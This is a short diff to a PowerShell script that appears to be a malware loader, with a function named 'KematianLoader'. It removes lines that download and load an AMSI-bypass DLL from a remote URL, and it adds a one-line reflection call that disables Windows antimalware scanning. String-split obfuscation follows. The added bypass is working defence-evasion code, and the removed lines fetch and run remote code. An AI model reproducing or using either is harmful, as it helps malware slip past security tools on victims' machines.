@@ -1,7 +1,5 @@
-$url = "https://raw.githubusercontent.com/43a1723/test/main/Extras/AMSI_Bypass.dll"
-$bytes = (New-Object Net.WebClient).DownloadData($url)
-$assembly = [System.Reflection.Assembly]::Load($bytes)
-[Bypass]::amsi()
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
 
 $ProgressPreference = ('Sil'+'ent'+'l'+'yContinu'+'e')
 function KematianLoader {
